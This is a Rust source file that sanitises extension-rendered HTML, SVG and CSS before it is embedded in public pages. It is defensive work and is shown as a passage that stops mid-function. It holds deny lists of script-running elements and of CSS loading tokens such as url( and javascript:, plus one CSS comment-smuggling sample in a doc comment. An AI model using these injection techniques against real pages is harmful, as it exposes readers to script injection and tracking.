//! What a block drew, made safe to write into a page anyone reads.
//!
//! A block's renderer is an extension's code: a page, a WASI component, a
//! Rust function. Its HTML (or inline SVG) goes into a page served to
//! people who never installed it, from the node's own origin. So what
//! comes through is decided by allow-lists, never by a list of what is
//! known to be bad:
//!
//! - **Elements.** Inside an `<svg>`, its drawing elements
//!   ([`SVG_ELEMENTS`], with a `<style>` sheet); outside, basic HTML
//!   ([`HTML_ELEMENTS`]: text, lists, tables, links, images, `<audio>`,
//!   `<video>`, `<details>`, and `<button>` for the lyrics block's lines).
//!   An element that runs or hides markup ([`DROPPED`]: `<script>`,
//!   `<template>`, `<noscript>`, `<textarea>`, `<foreignObject>`, every
//!   SMIL animation element, frames, form fields, …) goes with everything
//!   in it; any other element is left out and its contents kept.
//! - **Attributes.** `class`, `title`, `lang`, `dir`, `role`, `aria-*`,
//!   `data-*` (but not the page's own: `data-site-*`, `data-act`), `id`
//!   (but not the page's own: `site-*`, `share-*`, `comments`, nor a name
//!   the page's scripts read off `window`, [`RESERVED_IDS`]), a sanitised
//!   `style`, an SVG's geometry and presentation ([`SVG_ATTRS`], each value
//!   checked as CSS), and a few per element ([`html_attr`]). Never `on…`,
//!   `srcdoc`, `srcset`, `ping`, `action`, `formaction`.
//! - **URLs** (`href`, `xlink:href`, `src`), checked as a browser reads
//!   them (entities decoded, controls and whitespace ignored): a relative
//!   URL, a `#fragment`, `https:` and `mailto:` for a link, relative or
//!   `https:` for media, and only relative or
//!   `data:image/(png|jpeg|gif|webp)` for an image: a block loads no image
//!   from another site (a beacon). An SVG `<use>` refers only to its own
//!   document (`#id`).
//! - **CSS**, deliberately blunt ([`css_inert`]): no quote, comment,
//!   escape (`\`), `var(`, custom property (`--`) or at-rule (`@`) at all,
//!   so what is checked is what a browser reads; then nothing that loads
//!   or binds (`url(`, `image-set(`, `image(`, `src(`, `cross-fade(`,
//!   `element(`, `paint(`, `expression(`, `-moz-binding`, `behavior`) and
//!   no `position` but `static` or `relative`. A `style` attribute holding
//!   a quote, a comment, an escape or a brace is dropped whole; otherwise
//!   it loses each declaration refused. A presentation attribute may point
//!   only at its own drawing (`url(#id)`). A `<style>` sheet is kept only
//!   inside an `<svg>` of a block, as flat `selector { declarations }`
//!   rules, each selector rewritten under the block's own scope class
//!   ([`scope_sheet`]); one that is not is dropped whole.
//!
//! The site, not the block, wraps each block in a box it cannot style its
//! way out of (`features/sites/src/markdown.rs`, [`BLOCK_BOX_STYLE`]).
//!
//! [`sanitize`] reads the markup into its own model and writes that model
//! out again: every text escaped, every attribute value decoded, checked,
//! then quoted and escaped, every element it opened closed. What a browser
//! parses is therefore exactly what was checked, whatever the input tried.
//! An element tree ([`crate::elements_to_html`]) is written as markup and
//! then goes through [`sanitize`], so both paths keep by the same rules.

use std::collections::HashSet;

/// SVG elements kept inside an `<svg>`, as written out.
const SVG_ELEMENTS: &[&str] = &[
    "svg",
    "g",
    "path",
    "rect",
    "circle",
    "ellipse",
    "line",
    "polyline",
    "polygon",
    "text",
    "tspan",
    "textPath",
    "defs",
    "use",
    "symbol",
    "clipPath",
    "mask",
    "pattern",
    "linearGradient",
    "radialGradient",
    "stop",
    "marker",
    "title",
    "desc",
    "image",
    "a",
    "style",
];

/// HTML elements kept outside an `<svg>`.
const HTML_ELEMENTS: &[&str] = &[
    "svg",
    "div",
    "span",
    "p",
    "br",
    "hr",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "ul",
    "ol",
    "li",
    "dl",
    "dt",
    "dd",
    "table",
    "caption",
    "colgroup",
    "col",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "td",
    "th",
    "a",
    "strong",
    "em",
    "b",
    "i",
    "u",
    "s",
    "code",
    "pre",
    "blockquote",
    "figure",
    "figcaption",
    "img",
    "audio",
    "video",
    "source",
    "details",
    "summary",
    "small",
    "sub",
    "sup",
    "time",
    // The lyrics block's lines seek on click (`lyrics.rs`); only
    // `type="button"` is kept, and no form field can come through.
    "button",
];

/// Elements dropped with everything in them: they run, load, hide markup
/// in raw text, or are form fields. Any other element outside the lists
/// above is left out and its contents kept.
const DROPPED: &[&str] = &[
    "script",
    "style",
    "title",
    "noscript",
    "template",
    "textarea",
    "xmp",
    "plaintext",
    "listing",
    "noembed",
    "noframes",
    "iframe",
    "frame",
    "frameset",
    "object",
    "embed",
    "applet",
    "portal",
    "fencedframe",
    "base",
    "meta",
    "link",
    "head",
    "foreignobject",
    "math",
    "select",
    "option",
    "optgroup",
    "datalist",
    "input",
    "canvas",
    "animate",
    "set",
    "animatetransform",
    "animatemotion",
    "animatecolor",
    "discard",
    "mpath",
    "handler",
    "listener",
    "filter",
];

/// HTML elements with no closing tag.
pub(crate) const VOID: &[&str] = &[
    "area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track",
    "wbr",
];

/// An SVG's geometry and presentation attributes, in lower case.
const SVG_ATTRS: &[&str] = &[
    "viewbox",
    "preserveaspectratio",
    "version",
    "x",
    "y",
    "x1",
    "y1",
    "x2",
    "y2",
    "cx",
    "cy",
    "r",
    "rx",
    "ry",
    "fx",
    "fy",
    "fr",
    "dx",
    "dy",
    "width",
    "height",
    "d",
    "points",
    "pathlength",
    "transform",
    "fill",
    "fill-opacity",
    "fill-rule",
    "stroke",
    "stroke-width",
    "stroke-opacity",
    "stroke-linecap",
    "stroke-linejoin",
    "stroke-dasharray",
    "stroke-dashoffset",
    "stroke-miterlimit",
    "opacity",
    "color",
    "visibility",
    "display",
    "overflow",
    "vector-effect",
    "shape-rendering",
    "text-rendering",
    "paint-order",
    "clip-path",
    "clip-rule",
    "mask",
    "marker-start",
    "marker-mid",
    "marker-end",
    "font-family",
    "font-size",
    "font-weight",
    "font-style",
    "font-variant",
    "text-anchor",
    "text-decoration",
    "dominant-baseline",
    "alignment-baseline",
    "baseline-shift",
    "letter-spacing",
    "word-spacing",
    "writing-mode",
    "rotate",
    "textlength",
    "lengthadjust",
    "startoffset",
    "method",
    "spacing",
    "side",
    "offset",
    "stop-color",
    "stop-opacity",
    "gradientunits",
    "gradienttransform",
    "spreadmethod",
    "patternunits",
    "patterncontentunits",
    "patterntransform",
    "clippathunits",
    "maskunits",
    "maskcontentunits",
    "markerwidth",
    "markerheight",
    "markerunits",
    "refx",
    "refy",
    "orient",
];

/// Attributes any kept element may carry, in lower case (`id` and `style`
/// are checked further; `aria-*` and `data-*` by prefix).
const GLOBAL_ATTRS: &[&str] = &["class", "id", "title", "lang", "dir", "role", "style"];

/// What no CSS of a block may hold anywhere, in lower case: each lets
/// the text a browser reads differ from the text checked (strings,
/// comments and escapes hide or spell a needle, `var()` and custom
/// properties carry a value in from elsewhere), or is an at-rule.
const CSS_BLUNT: &[&str] = &["\"", "'", "/*", "\\", "var(", "--", "@", "<", "&"];

/// What no CSS of a block may hold, looked for in lower case with all
/// whitespace taken out: anything that loads, binds or runs.
const CSS_REFUSED: &[&str] = &[
    "url(",
    "image-set(",
    "image(",
    "src(",
    "cross-fade(",
    "element(",
    "paint(",
    "expression(",
    "-moz-binding",
    "behavior",
    "behaviour",
    "javascript:",
];

/// The `position`s a block's CSS may use: none that takes a box out of
/// the flow (`absolute`, `fixed`, `sticky`) to lay it over the page.
const POSITIONS: &[&str] = &["static", "relative"];

/// What a selector of a block's sheet may not name: the page above the
/// block.
const SELECTOR_REFUSED: &[&str] = &[":root", "html", "body", ":host"];

/// The inline style of the box the site wraps each block in: whatever a
/// block's CSS does, its paint, layout and counters stay inside it, and
/// what overflows scrolls inside it (a chart wider than the page, scrolled
/// to its playhead by `player.js`) or is clipped.
pub const BLOCK_BOX_STYLE: &str = "contain:layout paint style!important;overflow:auto!important;position:relative!important;isolation:isolate!important";

/// Names the page's scripts read off `window` (`features/sites/assets/*.js`)
/// that an element's `id` could shadow (named access on `window` comes
/// before `EventTarget`'s methods and anything a script sets later):
/// `player.js`'s `window.architect`, and the globals both scripts call.
const RESERVED_IDS: &[&str] = &[
    "architect",
    "addeventlistener",
    "removeeventlistener",
    "dispatchevent",
    "eventsource",
    "matchmedia",
    "getcomputedstyle",
    "comments",
];

const SVG_NS: &str = "http://www.w3.org/2000/svg";
const XLINK_NS: &str = "http://www.w3.org/1999/xlink";

/// What becomes of an element.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Rule {
    /// Written, by this name.
    Keep(&'static str),
    /// Left out; its contents are read as if it were not there.
    Unwrap,
    /// Left out with everything in it.
    Drop,
}

/// What becomes of the element `tag`, inside an `<svg>` or not.
pub(crate) fn element_rule(tag: &str, in_svg: bool) -> Rule {
    let list = if in_svg { SVG_ELEMENTS } else { HTML_ELEMENTS };
    if let Some(name) = list.iter().find(|n| n.eq_ignore_ascii_case(tag)) {
        return Rule::Keep(name);
    }
    if DROPPED.iter().any(|n| n.eq_ignore_ascii_case(tag)) {
        return Rule::Drop;
    }
    Rule::Unwrap
}

/// What the attribute `name` = `value` (its text, entities decoded) of a
/// kept element `tag` (as [`element_rule`] names it) is written as;
/// `None` when it is dropped. `in_svg` is true for an `<svg>` and what is
/// inside one.
pub(crate) fn attr_rule(tag: &str, name: &str, value: &str, in_svg: bool) -> Option<String> {
    if !is_name(name) {
        return None;
    }
    let lower = name.to_ascii_lowercase();
    let value: String = value
        .chars()
        .filter(|c| !c.is_control() || matches!(c, '\t' | '\n' | '\r'))
        .collect();
    match lower.as_str() {
        "style" => return clean_style(&value),
        "id" => return (!value.is_empty() && !reserved_id(&value)).then_some(value),
        "href" | "xlink:href" => {
            let ok = match tag {
                "use" => is_fragment(&value),
                "a" => url_ok(&value, Url::Link),
                "image" => url_ok(&value, Url::Image),
                _ => false,
            };
            return ok.then_some(value);
        }
        "src" => {
            let ok = match tag {
                "img" => url_ok(&value, Url::Image),
                "audio" | "video" | "source" => url_ok(&value, Url::Media),
                _ => false,
            };
            return ok.then_some(value);
        }
        "xmlns" => return (in_svg && value == SVG_NS).then_some(value),
        "xmlns:xlink" => return (in_svg && value == XLINK_NS).then_some(value),
        _ => {}
    }
    if lower.starts_with("aria-") && lower.len() > 5 {
        return Some(value);
    }
    if let Some(rest) = lower.strip_prefix("data-") {
        return (!rest.is_empty() && !rest.starts_with("site-") && rest != "act").then_some(value);
    }
    if GLOBAL_ATTRS.contains(&lower.as_str()) || html_attr(tag, &lower, &value) {
        return Some(value);
    }
    if in_svg && SVG_ATTRS.contains(&lower.as_str()) {
        // A presentation attribute is CSS: checked as a `style` value is,
        // and it may point at the drawing's own gradients (`url(#g)`),
        // never at anything else.
        return presentation_ok(&value).then_some(value);
    }
    None
}

/// The attributes an HTML element `tag` has of its own.
fn html_attr(tag: &str, lower: &str, value: &str) -> bool {
    match (tag, lower) {
        ("img" | "video", "width" | "height")
        | ("img", "alt")
        | ("audio" | "video", "controls" | "preload")
        | ("source", "type")
        | ("time", "datetime")
        | ("td" | "th", "colspan" | "rowspan")
        | ("col" | "colgroup", "span")
        | ("details", "open") => true,
        ("button", "type") => value.eq_ignore_ascii_case("button"),
        _ => false,
    }
}

/// An `id` the page's own script looks up (`site-queue`, `site-nav`,
/// `site-search`, `site-results`, `site-main`, `site-result-*`), the
/// share page writes (`share-*`, `comments`), or that would shadow a name
/// the page's scripts read off `window` ([`RESERVED_IDS`]): a block's
/// would win.
fn reserved_id(id: &str) -> bool {
    let lower = id.trim().to_ascii_lowercase();
    lower.starts_with("site-") || lower.starts_with("share-") || RESERVED_IDS.contains(&lower.as_str())
}

/// What a URL is for.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Url {
    /// `<a href>`: relative, `#…`, `https:`, `mailto:`.
    Link,
    /// `<img src>`, `<image href>`: relative, a raster `data:`. Never
    /// another site: a block's image would be a beacon.
    Image,
    /// `<audio>`/`<video>`/`<source>` `src`: relative, `https:`.
    Media,
}

/// `url` as a browser reads it for its scheme: no ASCII whitespace or
/// controls anywhere, `\` as `/`, lower case.
fn squeeze(url: &str) -> String {
    url.chars()
        .filter(|c| !c.is_ascii_whitespace() && !c.is_control())
        .map(|c| if c == '\\' { '/' } else { c })
        .collect::<String>()
        .to_ascii_lowercase()
}

/// Whether `url` is a reference into the same document (`#id`).
fn is_fragment(url: &str) -> bool {
    squeeze(url)
        .strip_prefix('#')
        .is_some_and(|f| !f.is_empty())
}

/// Whether `url` may be used `for` what it is.
fn url_ok(url: &str, used: Url) -> bool {
    let url = squeeze(url);
    if url.starts_with('#') {
        return used == Url::Link;
    }
    let scheme_end = url.find([':', '/', '?', '#']);
    let Some(colon) = scheme_end.filter(|&i| url.get(i..).is_some_and(|r| r.starts_with(':')))
    else {
        // No scheme: relative, but not `//host/…`, another site.
        return !url.starts_with("//");
    };
    let (scheme, rest) = url.split_at(colon);
    match scheme {
        "https" => used != Url::Image,
        "mailto" => used == Url::Link,
        "data" => {
            used == Url::Image
                && ["png", "jpeg", "gif", "webp"].iter().any(|kind| {
                    rest.strip_prefix(":image/")
                        .and_then(|r| r.strip_prefix(kind))
                        .is_some_and(|r| r.starts_with([';', ',']))
                })
        }
        _ => false,
    }
}

/// Whether `css` (a sheet, a `style` value, or a declaration) is inert:
/// nothing of [`CSS_BLUNT`] anywhere, nothing of [`CSS_REFUSED`] with its
/// whitespace taken out, and no `position` but [`POSITIONS`].
///
/// Strings, comments, escapes and `var()` are refused rather than
/// understood, so the text looked at is the text a browser reads: a sheet
/// `a{content:"/*"} *{background:url(…)} b{content:"*/"}` cannot hide its
/// middle rule from a comment stripper, and `position:/**/fixed` is not
/// `position:` and something else.
fn css_inert(css: &str) -> bool {
    let lower = css.to_ascii_lowercase();
    if CSS_BLUNT.iter().any(|bad| lower.contains(bad)) {
        return false;
    }
    let squeezed: String = lower
        .chars()
        .filter(|c| !c.is_whitespace() && !c.is_control())
        .collect();
    !CSS_REFUSED.iter().any(|bad| squeezed.contains(bad)) && positions_ok(&squeezed)
}

/// Whether every `position` declaration in `squeezed` (lower case, no
/// whitespace) is one of [`POSITIONS`]. A `position:` counts where a
/// declaration starts (`background-position:` is another property).
fn positions_ok(squeezed: &str) -> bool {
    squeezed.match_indices("position:").all(|(at, found)| {
        let starts = squeezed
            .get(..at)
            .is_none_or(|before| before.is_empty() || before.ends_with([';', '{']));
        let value = squeezed
            .get(at.saturating_add(found.len())..)
            .unwrap_or_default();
        let value = value.split([';', '}', '!']).next().unwrap_or_default();
        !starts || POSITIONS.contains(&value)
    })
}

/// One declaration (`name: value`) a block may write: a plain property
/// name (no custom property), a value with no brace or `;`, and inert.
fn declaration_ok(decl: &str) -> bool {
    let Some((name, value)) = decl.split_once(':') else {
        return false;
    };
    let name = name.trim();
    !name.is_empty()
        && name.chars().all(|c| c.is_ascii_alphabetic() || c == '-')
        && !name.starts_with("--")
        && !value.trim().is_empty()
        && !value.contains(['{', '}', ';'])
        && css_inert(decl)
}

/// A `style` attribute with only the declarations [`declaration_ok`]
/// keeps; `None` when nothing is left. One holding a quote, a comment, an
/// escape or a brace is dropped whole: where its declarations end can no
/// longer be told.
fn clean_style(value: &str) -> Option<String> {
    if value.contains(['"', '\'', '\\', '{', '}']) || value.contains("/*") {
        return None;
    }
    let kept: Vec<&str> = value
        .split(';')
        .map(str::trim)
        .filter(|d| !d.is_empty() && declaration_ok(d))
        .collect();
    let out = kept.join("; ");
    (!out.is_empty() && css_inert(&out)).then_some(out)
}

/// Whether an SVG presentation attribute's value is inert CSS, its only
/// `url()`s pointing into its own drawing, exactly `url(#id)`.
fn presentation_ok(value: &str) -> bool {
    let mut rest = value;
    let mut left = String::with_capacity(value.len());
    while let Some(at) = find_ci(rest, "url(#") {
        let (before, from) = cut(rest, at);
        let id_and_after = from.get("url(#".len()..).unwrap_or_default();
        let id_len = id_and_after
            .find(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
            .unwrap_or(id_and_after.len());
        let (id, after) = cut(id_and_after, id_len);
        let Some(after) = after.strip_prefix(')').filter(|_| !id.is_empty()) else {
            return false;
        };
        left.push_str(before);
        // A mark no needle holds, so what is left cannot join into one.
        left.push('#');
        rest = after;
    }
    left.push_str(rest);
    css_inert(&left)
}

/// `css`, a block's `<style>` sheet, with every rule under `.{scope}`,
/// the class of the box the site wraps the block in; `None` when it is not
/// flat `selector { declarations }` rules, each declaration
/// [`declaration_ok`], each selector one that can be put under the scope.
///
/// A selector already under the scope (`.{scope} x`, as a sheet comes out
/// of here) is kept as it is, so writing a block again changes nothing.
fn scope_sheet(css: &str, scope: &str) -> Option<String> {
    if !css_inert(css) {
        return None;
    }
    let mut out = String::with_capacity(css.len());
    let mut rest = css.trim();
    while !rest.is_empty() {
        let (selectors, after) = rest.split_once('{')?;
        let (body, after) = after.split_once('}')?;
        if selectors.contains(['}', ';']) || body.contains('{') {
            return None;
        }
        let declarations: Vec<&str> = body
            .split(';')
            .map(str::trim)
            .filter(|d| !d.is_empty())
            .collect();
        if !declarations.iter().all(|d| declaration_ok(d)) {
            return None;
        }
        rest = after.trim_start();
        if declarations.is_empty() {
            continue;
        }
        let scoped = selectors
            .split(',')
            .map(|sel| scope_selector(sel, scope))
            .collect::<Option<Vec<_>>>()?;
        out.push_str(&scoped.join(", "));
        out.push_str(" { ");
        out.push_str(&declarations.join("; "));
        out.push_str(" } ");
    }
    let out = out.trim_end().to_owned();
    (!out.is_empty()).then_some(out)
}

/// One selector of a list, under `.{scope}`; `None` for one that names the
/// page above the block ([`SELECTOR_REFUSED`]), starts with a combinator,
/// or whose brackets do not pair (a `,` inside `:is(…)` split it).
fn scope_selector(selector: &str, scope: &str) -> Option<String> {
    let sel = selector.trim();
    let lower = sel.to_ascii_lowercase();
    let pairs = |open: char, close: char| {
        sel.chars().filter(|&c| c == open).count() == sel.chars().filter(|&c| c == close).count()
    };
    if sel.is_empty()
        || sel.starts_with(['>', '+', '~'])
        || SELECTOR_REFUSED.iter().any(|bad| lower.contains(bad))
        || !pairs('(', ')')
        || !pairs('[', ']')
    {
        return None;
    }
    let prefix = format!(".{scope}");
    let already = sel
        .strip_prefix(&prefix)
        .and_then(|r| r.strip_prefix(|c: char| c.is_ascii_whitespace()))
        .is_some_and(|r| !r.trim().is_empty());
    Some(if already {
        sel.to_owned()
    } else {
        format!("{prefix} {sel}")
    })
}

/// Whether `scope` is a class name a sheet can be put under: `site-block`
/// and ASCII letters, digits and `-`.
fn scope_ok(scope: &str) -> bool {
    scope.starts_with("site-block")
        && scope
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-')
}

/// A tag or attribute name: letters, digits, `-`, `_`, `:` and `.`,
/// starting with a letter.
pub(crate) fn is_name(name: &str) -> bool {
    name.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | ':' | '.'))
}

/// `markup` (HTML or inline SVG), with only what the allow-lists keep,
/// re-written well formed.
///
/// It takes time and space linear in `markup` on any input: block markup
/// comes from extensions and notes, so a sanitiser that could be made to
/// loop or to allocate without bound would be a way to take a node down.
///
/// An SVG's `<style>` sheet is dropped: only a block, in the box the site
/// wraps it in, keeps one ([`sanitize_block`]).
#[must_use]
pub fn sanitize(markup: &str) -> String {
    sanitize_counting(markup, None).0
}

/// [`sanitize`] for a block the site wraps in a box of class `scope`
/// (`site-block-…`): an SVG's `<style>` sheet is kept when each of its
/// rules can be put under `.{scope}` ([`scope_sheet`]). A `scope` that is
/// not such a class keeps no sheet.
#[must_use]
pub fn sanitize_block(markup: &str, scope: &str) -> String {
    sanitize_counting(markup, scope_ok(scope).then_some(scope)).0
}

/// [`sanitize`] (sheets under `scope`), and how many passes its loop made
/// (never more than the bytes in `markup`).
fn sanitize_counting(markup: &str, scope: Option<&str>) -> (String, usize) {
    let mut w = Writer {
        scope,
        ..Writer::default()
    };
    let mut rest = markup;
    let mut passes = 0usize;
    // Termination: every pass consumes at least one byte of `rest` (the
    // text before a `<`, or the `<` itself and what `Writer::markup`
    // reads after it), so the loop runs at most `markup.len()` times.
    // Linearity: no scanner reads past what its pass consumes, except
    // `find_ci` and `skip_element`, which stop at the first match and
    // whose pass consumes through it, and the bounded look-ahead of
    // `entity` (`MAX_ENTITY` bytes). Output: at most six bytes per input
    // byte (`"` → `&quot;`), and an end tag per start tag read.
    while !rest.is_empty() {
        passes = passes.saturating_add(1);
        let before = rest.len();
        rest = w.step(rest);
        if rest.len() >= before {
            // Unreachable by the argument above; were it ever reached, the
            // rest is dropped rather than looped on.
            debug_assert!(false, "sanitize made no progress at {before} bytes left");
            break;
        }
    }
    (w.finish(), passes)
}

/// `s` split at byte `at`; all of it before when `at` is past its end or
/// inside a character.
fn cut(s: &str, at: usize) -> (&str, &str) {
    s.split_at_checked(at).unwrap_or((s, ""))
}

/// How many elements may be open at once. A start tag deeper than this
/// writes nothing (its text still does), which keeps [`Writer::close`]'s
/// search and the end tags written at most this long.
const MAX_OPEN: usize = 256;

#[derive(Default)]
struct Writer<'s> {
    /// The class the block's sheets are put under; none, none kept.
    scope: Option<&'s str>,
    out: String,
    /// The elements open, by the name written.
    open: Vec<&'static str>,
    /// How many of them are `<svg>`s.
    svgs: usize,
}

impl Writer<'_> {
    const fn in_svg(&self) -> bool {
        self.svgs > 0
    }

    /// Inside an SVG's `<title>` or `<desc>`, where a browser reads markup
    /// as HTML: text only.
    fn in_text_only(&self) -> bool {
        self.open
            .last()
            .is_some_and(|t| matches!(*t, "title" | "desc"))
    }

    /// One pass of [`sanitize`]: text up to the next `<` and the markup
    /// after it. Returns the rest, always shorter than `rest`.
    fn step<'a>(&mut self, rest: &'a str) -> &'a str {
        match rest.split_once('<') {
            None => {
                escape_keeping_entities(rest, &mut self.out);
                ""
            }
            Some((text, after)) => {
                escape_keeping_entities(text, &mut self.out);
                self.markup(after)
            }
        }
    }

    /// What follows a `<`; the rest after it.
    fn markup<'a>(&mut self, after: &'a str) -> &'a str {
        if let Some(body) = after.strip_prefix("!--") {
            return body.split_once("-->").map_or("", |(_, rest)| rest);
        }
        if let Some(body) = after.strip_prefix("![CDATA[") {
            let (text, rest) = body.split_once("]]>").unwrap_or((body, ""));
            escape(text, &mut self.out);
            return rest;
        }
        if after.starts_with('!') || after.starts_with('?') {
            return after.split_once('>').map_or("", |(_, rest)| rest);
        }
        if let Some(body) = after.strip_prefix('/') {
            let (name, tail) = take_name(body);
            let rest = tail.split_once('>').map_or("", |(_, rest)| rest);
            if !name.is_empty() {
                self.close(name);
            }
            return rest;
        }
        if !after.starts_with(|c: char| c.is_ascii_alphabetic()) {
            self.out.push_str("&lt;");
            return after;
        }
        let (name, tail) = take_name(after);
        let (attrs, self_closing, rest) = take_attrs(tail);
        let void = VOID.iter().any(|v| v.eq_ignore_ascii_case(name));
        let tag = match element_rule(name, self.in_svg()) {
            Rule::Drop if self_closing || void => return rest,
            Rule::Drop => return skip_element(name, rest),
            Rule::Unwrap => return rest,
            Rule::Keep(_) if !is_name(name) || self.in_text_only() => return rest,
            Rule::Keep(tag) => tag,
        };
        if tag == "style" {
            return self.sheet(self_closing, rest);
        }
        if !void && !self_closing && self.open.len() >= MAX_OPEN {
            return rest;
        }
        let in_svg = self.in_svg() || tag == "svg";
        self.out.push('<');
        self.out.push_str(tag);
        let mut seen = HashSet::new();
        for (attr, value) in &attrs {
            // A browser keeps the first of two attributes of one name.
            if !seen.insert(attr.to_ascii_lowercase()) {
                continue;
            }
            if let Some(value) = attr_rule(tag, attr, &decode(value), in_svg) {
                self.out.push(' ');
                self.out.push_str(attr);
                self.out.push_str("=\"");
                escape(&value, &mut self.out);
                self.out.push('"');
            }
        }
        self.out.push('>');
        if void {
            return rest;
        }
        if self_closing {
            self.out.push_str("</");
            self.out.push_str(tag);
            self.out.push('>');
        } else {
            self.open.push(tag);
            if tag == "svg" {
                self.svgs = self.svgs.saturating_add(1);
            }
        }
        rest
    }

    /// An SVG's `<style>` sheet, whose start tag was just read: written
    /// under the block's scope when [`scope_sheet`] can, else not at all.
    /// The rest after its end tag.
    fn sheet<'a>(&mut self, self_closing: bool, rest: &'a str) -> &'a str {
        if self_closing {
            return rest;
        }
        let (css, tail) = cut(rest, find_end_tag(rest, "</style").unwrap_or(rest.len()));
        let after = tail.split_once('>').map_or("", |(_, r)| r);
        let scoped = self.scope.and_then(|scope| scope_sheet(css, scope));
        if let Some(css) = scoped.filter(|_| self.open.len() < MAX_OPEN) {
            self.out.push_str("<style>");
            self.out.push_str(&css);
            self.out.push_str("</style>");
        }
        after
    }

    /// Close `name` and what is open inside it; nothing when it is not
    /// open.
    fn close(&mut self, name: &str) {
        let Some(at) = self.open.iter().rposition(|t| t.eq_ignore_ascii_case(name)) else {
            return;
        };
        for tag in self.open.split_off(at).into_iter().rev() {
            self.end(tag);
        }
    }

    fn end(&mut self, tag: &str) {
        if tag == "svg" {
            self.svgs = self.svgs.saturating_sub(1);
        }
        self.out.push_str("</");
        self.out.push_str(tag);
        self.out.push('>');
    }

    fn finish(mut self) -> String {
        for tag in std::mem::take(&mut self.open).into_iter().rev() {
            self.end(tag);
        }
        self.out
    }
}

/// Where `needle` (ASCII, lower case) starts in `hay`, in any case.
fn find_ci(hay: &str, needle: &str) -> Option<usize> {
    hay.as_bytes()
        .windows(needle.len())
        .position(|w| w.eq_ignore_ascii_case(needle.as_bytes()))
}

/// Where the end tag `needle` (`</name`, ASCII, lower case) starts in
/// `hay`, in any case: followed by whitespace, `/`, `>` or the end, so
/// `</styles>` is not `</style`. Each search starts past the last, so
/// this reads `hay` once.
fn find_end_tag(hay: &str, needle: &str) -> Option<usize> {
    let mut from = 0usize;
    loop {
        let at = from.saturating_add(find_ci(hay.get(from..)?, needle)?);
        let past = at.saturating_add(needle.len());
        match hay.as_bytes().get(past) {
            None => return Some(at),
            Some(b) if b.is_ascii_whitespace() || matches!(b, b'/' | b'>') => return Some(at),
            Some(_) => from = past,
        }
    }
}

/// A name at the start of `s` (up to whitespace, `/`, `>`, `<` or `=`),
/// and what follows it.
fn take_name(s: &str) -> (&str, &str) {
    let end = s
        .find(|c: char| c.is_ascii_whitespace() || matches!(c, '/' | '>' | '=' | '<'))
        .unwrap_or(s.len());
    cut(s, end)
}

/// A start tag's attributes (values as written), whether it ends `/>`,
/// and what follows its `>`.
fn take_attrs(mut s: &str) -> (Vec<(String, String)>, bool, &str) {
    let mut attrs = Vec::new();
    loop {
        s = s.trim_start_matches(|c: char| c.is_ascii_whitespace());
        if s.is_empty() {
            return (attrs, false, "");
        }
        if let Some(rest) = s.strip_prefix("/>") {
            return (attrs, true, rest);
        }
        if let Some(rest) = s.strip_prefix('>') {
            return (attrs, false, rest);
        }
        let (name, tail) = take_name(s);
        if name.is_empty() {
            // A stray `/`, `=` or `<` (ASCII, one byte): skip it.
            s = cut(s, 1).1;
            continue;
        }
        let tail = tail.trim_start_matches(|c: char| c.is_ascii_whitespace());
        let Some(value_at) = tail.strip_prefix('=') else {
            attrs.push((name.to_owned(), String::new()));
            s = tail;
            continue;
        };
        let value_at = value_at.trim_start_matches(|c: char| c.is_ascii_whitespace());
        let quoted = value_at
            .strip_prefix('"')
            .map(|b| (b, '"'))
            .or_else(|| value_at.strip_prefix('\'').map(|b| (b, '\'')));
        let (value, rest) = match quoted {
            Some((body, q)) => body.split_once(q).unwrap_or((body, "")),
            None => cut(
                value_at,
                value_at
                    .find(|c: char| c.is_ascii_whitespace() || c == '>')
                    .unwrap_or(value_at.len()),
            ),
        };
        attrs.push((name.to_owned(), value.to_owned()));
        s = rest;
    }
}

/// Past the end of a dropped `name` whose start tag was just read: its
/// matching end tag, nested ones of the same name counted. Unclosed, the
/// rest is dropped.
fn skip_element<'a>(name: &str, mut rest: &'a str) -> &'a str {
    let mut depth = 1usize;
    // Each pass moves `rest` past one more `<`, and reads after it only up
    // to the next `<` (a name, then the tag up to its `>`): every byte is
    // read at most twice, so a run of unterminated `<script` tags stays
    // linear.
    loop {
        let Some((_, after)) = rest.split_once('<') else {
            return "";
        };
        rest = after;
        let closing = after.starts_with('/');
        let (found, tail) = take_name(after.strip_prefix('/').unwrap_or(after));
        if !found.eq_ignore_ascii_case(name) {
            continue;
        }
        let Some(end) = tail.find(['>', '<']) else {
            return "";
        };
        let Some(past) = tail.get(end..).and_then(|t| t.strip_prefix('>')) else {
            // A `<` before any `>`: not a tag (a browser reads
            // `</script<b>` as the end tag `script<b`).
            continue;
        };
        let tag = tail.get(..end).unwrap_or_default();
        if closing {
            depth = depth.saturating_sub(1);
            if depth == 0 {
                return past;
            }
        } else if !tag.ends_with('/') {
            depth = depth.saturating_add(1);
        }
    }
}

/// `text` escaped for HTML text and a double-quoted attribute, a well
/// formed character reference (`&amp;`, `&#38;`, `&#x26;`) kept as it is.
fn escape_keeping_entities(text: &str, out: &mut String) {
    let mut rest = text;
    while let Some((before, after)) = rest.split_once('&') {
        escape(before, out);
        if let Some((name, past)) = entity(after) {
            out.push('&');
            out.push_str(name);
            out.push(';');
            rest = past;
        } else {
            out.push_str("&amp;");
            rest = after;
        }
    }
    escape(rest, out);
}

/// The longest character reference kept: a 32-byte name and its `;`.
const MAX_ENTITY: usize = 33;

/// The character reference that follows a `&` at the start of `s`
/// (`amp;`, `#9;`, `#x9;`): its name, and what follows its `;`.
///
/// It looks at most [`MAX_ENTITY`] bytes ahead, so text full of `&` with
/// no `;` stays linear.
fn entity(s: &str) -> Option<(&str, &str)> {
    let semi = s.bytes().take(MAX_ENTITY).position(|b| b == b';')?;
    let (name, rest) = s.split_at_checked(semi)?;
    let rest = rest.strip_prefix(';')?;
    let ok = match numeric(name) {
        Some((digits, 16)) => {
            !digits.is_empty() && digits.len() <= 6 && digits.chars().all(|c| c.is_ascii_hexdigit())
        }
        Some((digits, _)) => {
